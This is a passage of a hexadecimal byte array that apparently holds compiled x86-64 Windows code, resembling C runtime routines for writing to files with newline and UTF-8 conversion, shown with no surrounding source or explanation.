0x0, 0xe8, 0x66, 0xb7, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xeb, 0x4e, 0x85, 0xc9, 0x78, 0x32, 0x3b, 0xd, 0xfc, 0xf2, 0x0, 0x0, 0x73, 0x2a, 0x48, 0x63, 0xc9, 0x4c, 0x8d, 0x5, 0xf0, 0xee, 0x0, 0x0, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x3f, 0x48, 0xc1, 0xe8, 0x6, 0x48, 0x8d, 0x14, 0xc9, 0x49, 0x8b, 0x4, 0xc0, 0xf6, 0x44, 0xd0, 0x38, 0x1, 0x74, 0x7, 0x48, 0x8b, 0x44, 0xd0, 0x28, 0xeb, 0x1c, 0xe8, 0x3, 0xb7, 0xff, 0xff, 0x83, 0x20, 0x0, 0xe8, 0x1b, 0xb7, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0xd4, 0xb5, 0xff, 0xff, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x8b, 0xa, 0xe8, 0x60, 0xfe, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x3, 0x48, 0x63, 0x8, 0x48, 0x8b, 0xd1, 0x48, 0x8b, 0xc1, 0x48, 0xc1, 0xf8, 0x6, 0x4c, 0x8d, 0x5, 0x78, 0xee, 0x0, 0x0, 0x83, 0xe2, 0x3f, 0x48, 0x8d, 0x14, 0xd2, 0x49, 0x8b, 0x4, 0xc0, 0xf6, 0x44, 0xd0, 0x38, 0x1, 0x74, 0x23, 0xe8, 0x3d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0x98, 0x3d, 0x0, 0x0, 0x33, 0xdb, 0x85, 0xc0, 0x75, 0x1d, 0xff, 0x15, 0xc, 0x3c, 0x0, 0x0, 0x8b, 0xd8, 0xe8, 0x7d, 0xb6, 0xff, 0xff, 0x89, 0x18, 0xe8, 0x96, 0xb6, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0x83, 0xcb, 0xff, 0x8b, 0xf, 0xe8, 0x26, 0xfe, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x38, 0x48, 0x63, 0xd1, 0x83, 0xfa, 0xfe, 0x75, 0xd, 0xe8, 0x63, 0xb6, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xeb, 0x6c, 0x85, 0xc9, 0x78, 0x58, 0x3b, 0x15, 0xf9, 0xf1, 0x0, 0x0, 0x73, 0x50, 0x48, 0x8b, 0xca, 0x4c, 0x8d, 0x5, 0xed, 0xed, 0x0, 0x0, 0x83, 0xe1, 0x3f, 0x48, 0x8b, 0xc2, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xc9, 0x49, 0x8b, 0x4, 0xc0, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x74, 0x2d, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x89, 0x54, 0x24, 0x50, 0x89, 0x54, 0x24, 0x58, 0x4c, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x8d, 0x54, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0xfd, 0xfe, 0xff, 0xff, 0xeb, 0x13, 0xe8, 0xfa, 0xb5, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0xb3, 0xb4, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa9, 0x48, 0x81, 0xec, 0xe0, 0x0, 0x0, 0x0, 0x48, 0xc7, 0x45, 0xf7, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x58, 0x8, 0x48, 0x8b, 0x5, 0x70, 0xdb, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0x17, 0x49, 0x8b, 0xf0, 0x4c, 0x89, 0x45, 0xb7, 0x4c, 0x63, 0xf2, 0x48, 0x8b, 0xd9, 0x4c, 0x8b, 0x6d, 0x7f, 0x4c, 0x89, 0x6d, 0xaf, 0x49, 0x8b, 0xce, 0x48, 0x89, 0x4d, 0xe7, 0x49, 0x8b, 0xc6, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x89, 0x45, 0xa7, 0x48, 0x8d, 0x15, 0xfb, 0x49, 0xff, 0xff, 0x83, 0xe1, 0x3f, 0x48, 0x89, 0x4d, 0xef, 0x4c, 0x8d, 0x3c, 0xc9, 0x48, 0x8b, 0x84, 0xc2, 0x30, 0xa3, 0x1, 0x0, 0x4a, 0x8b, 0x44, 0xf8, 0x28, 0x48, 0x89, 0x45, 0xd7, 0x45, 0x8b, 0xe1, 0x4d, 0x3, 0xe0, 0x4c, 0x89, 0x65, 0x8f, 0xff, 0x15, 0x4f, 0x3c, 0x0, 0x0, 0x89, 0x45, 0x9f, 0x33, 0xff, 0x41, 0x38, 0x7d, 0x28, 0x75, 0x8, 0x49, 0x8b, 0xcd, 0xe8, 0x2c, 0xa7, 0xff, 0xff, 0x49, 0x8b, 0x4d, 0x18, 0x44, 0x8b, 0x41, 0xc, 0x44, 0x89, 0x45, 0xa3, 0x33, 0xc0, 0x48, 0x89, 0x3, 0x89, 0x43, 0x8, 0x4c, 0x39, 0x65, 0xb7, 0xf, 0x83, 0xa2, 0x3, 0x0, 0x0, 0x49, 0x8b, 0xc6, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x89, 0x45, 0xdf, 0x8b, 0xd7, 0x8a, 0xe, 0x88, 0x4c, 0x24, 0x40, 0x89, 0x7d, 0x83, 0x41, 0xbc, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x1d, 0x7b, 0x49, 0xff, 0xff, 0x41, 0x81, 0xf8, 0xe9, 0xfd, 0x0, 0x0, 0xf, 0x85, 0x7a, 0x1, 0x0, 0x0, 0x8b, 0xd7, 0x4c, 0x8b, 0xf7, 0x49, 0x8b, 0x84, 0xc3, 0x30, 0xa3, 0x1, 0x0, 0x4e, 0x8d, 0xc, 0xfd, 0x3e, 0x0, 0x0, 0x0, 0x4c, 0x3, 0xc8, 0x49, 0x8b, 0xc1, 0x40, 0x38, 0x38, 0x74, 0xe, 0xff, 0xc2, 0x49, 0xff, 0xc6, 0x48, 0xff, 0xc0, 0x49, 0x83, 0xfe, 0x5, 0x7c, 0xed, 0x4d, 0x85, 0xf6, 0xf, 0x84, 0xd5, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x55, 0xa7, 0x4b, 0x8b, 0x84, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x42, 0xf, 0xb6, 0x4c, 0xf8, 0x3e, 0x46, 0xf, 0xbe, 0xa4, 0x19, 0xf0, 0x99, 0x1, 0x0, 0x41, 0xff, 0xc4, 0x41, 0x8b, 0xc4, 0x2b, 0xc2, 0x89, 0x45, 0x97, 0x48, 0x8b, 0x55, 0x8f, 0x48, 0x2b, 0xd6, 0x4c, 0x63, 0xc0, 0x4c, 0x3b, 0xc2, 0xf, 0x8f, 0x71, 0x2, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0x41, 0x8a, 0x1, 0x88, 0x44, 0xd, 0xff, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc1, 0x49, 0x3b, 0xce, 0x7c, 0xee, 0x4d, 0x85, 0xc0, 0x7e, 0x1a, 0x48, 0x8d, 0x4d, 0xff, 0x49, 0x3, 0xce, 0x48, 0x8b, 0xd6, 0xe8, 0x65, 0x66, 0xff, 0xff, 0x4c, 0x8b, 0x55, 0xa7, 0x4c, 0x8d, 0x1d, 0xca, 0x48, 0xff, 0xff, 0x48, 0x8b, 0xd7, 0x4b, 0x8b, 0x8c, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x48, 0x3, 0xca, 0x42, 0x88, 0x7c, 0xf9, 0x3e, 0x48, 0xff, 0xc2, 0x49, 0x3b, 0xd6, 0x7c, 0xe8, 0x48, 0x89, 0x7d, 0xbf, 0x48, 0x8d, 0x45, 0xff, 0x48, 0x89, 0x45, 0xc7, 0x8b, 0xc7, 0x41, 0x83, 0xfc, 0x4, 0xf, 0x94, 0xc0, 0xff, 0xc0, 0x44, 0x8b, 0xe0, 0x44, 0x8b, 0xc0, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0xbf, 0x48, 0x8d, 0x55, 0xc7, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0xc, 0xc, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x76, 0x2, 0x0, 0x0, 0x8b, 0x45, 0x97, 0xff, 0xc8, 0x48, 0x63, 0xc8, 0x48, 0x3, 0xf1, 0xe9, 0x3, 0x1, 0x0, 0x0, 0xf, 0xb6, 0x6, 0x4e, 0xf, 0xbe, 0xac, 0x18, 0xf0, 0x99, 0x1, 0x0, 0x41, 0x8d, 0x4d, 0x1, 0x4c, 0x8b, 0x45, 0x8f, 0x4c, 0x2b, 0xc6, 0x48, 0x63, 0xc1, 0x49, 0x3b, 0xc0, 0xf, 0x8f, 0xe0, 0x1, 0x0, 0x0, 0x48, 0x89, 0x7d, 0x97, 0x48, 0x89, 0x75, 0xcf, 0x8b, 0xc7, 0x83, 0xf9, 0x4, 0xf, 0x94, 0xc0, 0xff, 0xc0, 0x44, 0x8b, 0xf0, 0x44, 0x8b, 0xc0, 0x48, 0x8b, 0x45, 0xaf, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0x97, 0x48, 0x8d, 0x55, 0xcf, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0x9d, 0xb, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x7, 0x2, 0x0, 0x0, 0x49, 0x3, 0xf5, 0x45, 0x8b, 0xe6, 0x4c, 0x8b, 0x6d, 0xaf, 0xe9, 0x95, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x55, 0xa7, 0x4f, 0x8b, 0x8c, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x43, 0x8a, 0x4c, 0xf9, 0x3d, 0xf6, 0xc1, 0x4, 0x74, 0x21, 0x43, 0x8a, 0x44, 0xf9, 0x3e, 0x88, 0x45, 0x7, 0x8a, 0x6, 0x88, 0x45, 0x8, 0x80, 0xe1, 0xfb, 0x43, 0x88, 0x4c, 0xf9, 0x3d, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0x7, 0xeb, 0x49, 0x44, 0xf, 0xb6, 0x6, 0x49, 0x8b, 0x45, 0x18, 0x48, 0x8b, 0x8, 0x66, 0x42, 0x39, 0x3c, 0x41, 0x7d, 0x31, 0x4c, 0x8d, 0x76, 0x1, 0x4c, 0x3b, 0x75, 0x8f, 0xf, 0x83, 0x7c, 0x1, 0x0, 0x0, 0x4d, 0x8b, 0xcd, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd6, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0xb0, 0xe1, 0xff, 0xff, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x83, 0x1, 0x0, 0x0, 0x49, 0x8b, 0xf6, 0xeb, 0x1b, 0x4d, 0x8b, 0xc4, 0x48, 0x8b, 0xd6, 0x4d, 0x8b, 0xcd, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0x90, 0xe1, 0xff, 0xff, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x63, 0x1, 0x0, 0x0, 0x48, 0xff, 0xc6, 0x48, 0x89, 0x7c, 0x24, 0x38, 0x48, 0x89, 0x7c, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x28, 0x5, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x45, 0xf, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x8b, 0xcc, 0x4c, 0x8d, 0x45, 0x83, 0x33, 0xd2, 0x8b, 0x4d, 0x9f, 0xe8, 0xe8, 0xcc, 0xff, 0xff, 0x44, 0x8b, 0xf0, 0x85, 0xc0, 0xf, 0x84, 0x29, 0x1, 0x0, 0x0, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0x87, 0x44, 0x8b, 0xc0, 0x48, 0x8d, 0x55, 0xf, 0x4c, 0x8b, 0x65, 0xd7, 0x49, 0x8b, 0xcc, 0xff, 0x15, 0x80, 0x39, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xfc, 0x0, 0x0, 0x0, 0x8b, 0xd6, 0x2b, 0x55, 0xb7, 0x3, 0x53, 0x8, 0x89, 0x53, 0x4, 0x44, 0x39, 0x75, 0x87, 0xf, 0x82, 0xef, 0x0, 0x0, 0x0, 0x80, 0x7c, 0x24, 0x40, 0xa, 0x75, 0x40, 0xb8, 0xd, 0x0, 0x0, 0x0, 0x66, 0x89, 0x44, 0x24, 0x40, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0x87, 0x44, 0x8d, 0x40, 0xf4, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x8b, 0xcc, 0xff, 0x15, 0x37, 0x39, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xb3, 0x0, 0x0, 0x0, 0x83, 0x7d, 0x87, 0x1, 0xf, 0x82, 0xb1, 0x0, 0x0, 0x0, 0xff, 0x43, 0x8, 0xff, 0x43, 0x4, 0x8b, 0x53, 0x4, 0x48, 0x3b, 0x75, 0x8f, 0xf, 0x83, 0x9e, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xdf, 0x44, 0x8b, 0x45, 0xa3, 0xe9, 0xfc, 0xfc, 0xff, 0xff, 0x48, 0x85, 0xd2, 0x7e, 0x24, 0x49, 0x2b, 0xf6, 0x4b, 0x8b, 0x8c, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x49, 0x3, 0xce, 0x42, 0x8a, 0x4, 0x36, 0x42, 0x88, 0x44, 0xf9, 0x3e, 0xff, 0xc7, 0x49, 0xff, 0xc6, 0x48, 0x63, 0xc7, 0x48, 0x3b, 0xc2, 0x7c, 0xdf, 0x1, 0x53, 0x4, 0xeb, 0x63, 0x4d, 0x85, 0xc0, 0x7e, 0x33, 0x48, 0x8b, 0xd7, 0x4c, 0x8b, 0x55, 0xe7, 0x49, 0xc1, 0xfa, 0x6, 0x48, 0x8b, 0x45, 0xef, 0x4c, 0x8d, 0xc, 0xc0, 0x4b, 0x8b, 0x84, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x4a, 0x8d, 0xc, 0xc8, 0x8a, 0x4, 0x32, 0x88, 0x44, 0x11, 0x3e, 0xff, 0xc7, 0x48, 0xff, 0xc2, 0x48, 0x63, 0xc7, 0x49, 0x3b, 0xc0, 0x7c, 0xe0, 0x44, 0x1, 0x43, 0x4, 0xeb, 0x25, 0x8a, 0x6, 0x43, 0x88, 0x44, 0xf9, 0x3e, 0x4b, 0x8b, 0x84, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x42, 0x80, 0x4c, 0xf8, 0x3d, 0x4, 0x8d, 0x42, 0x1, 0x89, 0x43, 0x4, 0xeb, 0x8, 0xff, 0x15, 0xee, 0x36, 0x0, 0x0, 0x89, 0x3, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x4d, 0x17, 0x48, 0x33, 0xcc, 0xe8, 0x9d, 0x25, 0x0, 0x0, 0x48, 0x8b, 0x9c, 0x24, 0x20, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xe0, 0x0, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0xb8, 0x50, 0x14, 0x0, 0x0, 0xe8, 0x48, 0x28, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8b, 0x5, 0xee, 0xd6, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x40, 0x14, 0x0, 0x0, 0x4c, 0x63, 0xd2, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xc2, 0x41, 0x8b, 0xe9, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xd, 0xbc, 0xe8, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x49, 0x3, 0xe8, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0x4, 0xc1, 0x4b, 0x8d, 0x14, 0xd2, 0x4c, 0x8b, 0x74, 0xd0, 0x28, 0x33, 0xc0, 0x48, 0x89, 0x7, 0x89, 0x47, 0x8, 0x4c, 0x3b, 0xc5, 0x73, 0x6f, 0x48, 0x8d, 0x5c, 0x24, 0x40, 0x48, 0x3b, 0xf5, 0x73, 0x24, 0x8a, 0x6, 0x48, 0xff, 0xc6, 0x3c, 0xa, 0x75, 0x9, 0xff, 0x47, 0x8, 0xc6, 0x3, 0xd, 0x48, 0xff, 0xc3, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x48, 0x8d, 0x84, 0x24, 0x3f, 0x14, 0x0, 0x0, 0x48, 0x3b, 0xd8, 0x72, 0xd7, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x2b, 0xd8, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x8b, 0xce, 0xff, 0x15, 0x8f, 0x37, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x8b, 0x44, 0x24, 0x30, 0x1, 0x47, 0x4, 0x3b, 0xc3, 0x72, 0xf, 0x48, 0x3b, 0xf5, 0x72, 0x9b, 0xeb, 0x8, 0xff, 0x15, 0xeb, 0x35, 0x0, 0x0, 0x89, 0x7, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x8c, 0x24, 0x40, 0x14, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x96, 0x24, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x50, 0x14, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x6b, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0xb8, 0x50, 0x14, 0x0, 0x0, 0xe8, 0x44, 0x27, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8b, 0x5, 0xea, 0xd5, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x40, 0x14, 0x0, 0x0, 0x4c, 0x63, 0xd2, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xc2, 0x41, 0x8b, 0xe9, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xd, 0xb8, 0xe7, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x49, 0x3, 0xe8, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0x4, 0xc1, 0x4b, 0x8d, 0x14, 0xd2, 0x4c, 0x8b, 0x74, 0xd0, 0x28, 0x33, 0xc0, 0x48, 0x89, 0x7, 0x89, 0x47, 0x8, 0x4c, 0x3b, 0xc5, 0xf, 0x83, 0x82, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x5c, 0x24, 0x40, 0x48, 0x3b, 0xf5, 0x73, 0x31, 0xf, 0xb7, 0x6, 0x48, 0x83, 0xc6, 0x2, 0x66, 0x83, 0xf8, 0xa, 0x75, 0x10, 0x83, 0x47, 0x8, 0x2, 0xb9, 0xd, 0x0, 0x0, 0x0, 0x66, 0x89, 0xb, 0x48, 0x83, 0xc3, 0x2, 0x66, 0x89, 0x3, 0x48, 0x83, 0xc3, 0x2, 0x48, 0x8d, 0x84, 0x24, 0x3e, 0x14, 0x0, 0x0, 0x48, 0x3b, 0xd8, 0x72, 0xca, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x2b, 0xd8, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x48, 0xd1, 0xfb, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x3, 0xdb, 0x49, 0x8b, 0xce, 0x44, 0x8b, 0xc3, 0xff, 0x15, 0x74, 0x36, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x8b, 0x44, 0x24, 0x30, 0x1, 0x47, 0x4, 0x3b, 0xc3, 0x72, 0xf, 0x48, 0x3b, 0xf5, 0x72, 0x88, 0xeb, 0x8, 0xff, 0x15, 0xd0, 0x34, 0x0, 0x0, 0x89, 0x7, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x8c, 0x24, 0x40, 0x14, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x7b, 0x23, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x50, 0x14, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x6b, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0xb8, 0x70, 0x14, 0x0, 0x0, 0xe8, 0x24, 0x26, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8b, 0x5, 0xca, 0xd4, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x60, 0x14, 0x0, 0x0, 0x4c, 0x63, 0xd2, 0x48, 0x8b, 0xd9, 0x49, 0x8b, 0xc2, 0x45, 0x8b, 0xf1, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xd, 0x98, 0xe6, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x4d, 0x3, 0xf0, 0x4d, 0x8b, 0xf8, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0x4, 0xc1, 0x4b, 0x8d, 0x14, 0xd2, 0x4c, 0x8b, 0x64, 0xd0, 0x28, 0x33, 0xc0, 0x48, 0x89, 0x3, 0x4d, 0x3b, 0xc6, 0x89, 0x43, 0x8, 0xf, 0x83, 0xce, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x50, 0x49, 0x3b, 0xfe, 0x73, 0x2d, 0xf, 0xb7, 0xf, 0x48, 0x83, 0xc7, 0x2, 0x66, 0x83, 0xf9, 0xa, 0x75, 0xc, 0xba, 0xd, 0x0, 0x0, 0x0, 0x66, 0x89, 0x10, 0x48, 0x83, 0xc0, 0x2, 0x66, 0x89, 0x8, 0x48, 0x83, 0xc0, 0x2, 0x48, 0x8d, 0x8c, 0x24, 0xf8, 0x6, 0x0, 0x0, 0x48, 0x3b, 0xc1, 0x72, 0xce, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x4c, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x2b, 0xc1, 0xc7, 0x44, 0x24, 0x28, 0x55, 0xd, 0x0, 0x0, 0x48, 0x8d, 0x8c, 0x24, 0x0, 0x7, 0x0, 0x0, 0x48, 0xd1, 0xf8, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x44, 0x8b, 0xc8, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x33, 0xd2, 0xe8, 0x7e, 0xc8, 0xff, 0xff, 0x8b, 0xe8, 0x85, 0xc0, 0x74, 0x49, 0x33, 0xf6, 0x85, 0xc0, 0x74, 0x33, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x48, 0x8d, 0x94, 0x24, 0x0, 0x7, 0x0, 0x0, 0x8b, 0xce, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x44, 0x8b, 0xc5, 0x48, 0x3, 0xd1, 0x49, 0x8b, 0xcc, 0x44, 0x2b, 0xc6, 0xff, 0x15, 0xb, 0x35, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x18, 0x3, 0x74, 0x24, 0x40, 0x3b, 0xf5, 0x72, 0xcd, 0x8b, 0xc7, 0x41, 0x2b, 0xc7, 0x89, 0x43, 0x4, 0x49, 0x3b, 0xfe, 0xe9, 0x34, 0xff, 0xff, 0xff, 0xff, 0x15, 0x61, 0x33, 0x0, 0x0, 0x89, 0x3, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x8c, 0x24, 0x60, 0x14, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0xc, 0x22, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x70, 0x14, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x60, 0x20, 0x89, 0x48, 0x8, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0xd9, 0x45, 0x8b, 0xe0, 0x4c, 0x8b, 0xea, 0x48, 0x63, 0xf9, 0x83, 0xff, 0xfe, 0x75, 0x1c, 0x41, 0xc6, 0x41, 0x38, 0x1, 0x41, 0x83, 0x61, 0x34, 0x0, 0x41, 0xc6, 0x41, 0x30, 0x1, 0x41, 0xc7, 0x41, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xe9, 0xbf, 0x0, 0x0, 0x0, 0x85, 0xc9, 0xf, 0x88, 0x86, 0x0, 0x0, 0x0, 0x3b, 0x3d, 0x19, 0xe9, 0x0, 0x0, 0x73, 0x7e, 0x48, 0x8b, 0xc7, 0x4c, 0x8b, 0xff, 0x49, 0xc1, 0xef, 0x6, 0x48, 0x8d, 0x15, 0x6, 0xe5, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x48, 0x8d, 0xc, 0xc0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4a, 0x8b, 0x4, 0xfa, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x74, 0x56, 0x8b, 0xcf, 0xe8, 0xb8, 0xf4, 0xff, 0xff, 0x41, 0x83, 0xce, 0xff, 0x48, 0x8d, 0x5, 0xdd, 0xe4, 0x0, 0x0, 0x4a, 0x8b, 0x4, 0xf8, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x75, 0x15, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xc6, 0x43, 0x38, 0x1, 0x83, 0x63, 0x34, 0x0, 0xeb, 0x13, 0x4c, 0x8b, 0xcb, 0x45, 0x8b, 0xc4, 0x49, 0x8b, 0xd5, 0x8b, 0xcf, 0xe8, 0x60, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xf0, 0x8b, 0xcf, 0xe8, 0x96, 0xf4, 0xff, 0xff, 0x41, 0x8b, 0xc6, 0xeb, 0x34, 0x48, 0x89, 0x5c, 0x24, 0x28, 0x41, 0xc6, 0x41, 0x38, 0x1, 0x41, 0x83, 0x61, 0x34, 0x0, 0x41, 0xc6, 0x41, 0x30, 0x1, 0x41, 0xc7, 0x41, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0xb4, 0xaa, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x68, 0x48, 0x8b, 0x7c, 0x24, 0x70, 0x4c, 0x8b, 0x64, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x68, 0x33, 0xff, 0x45, 0x8b, 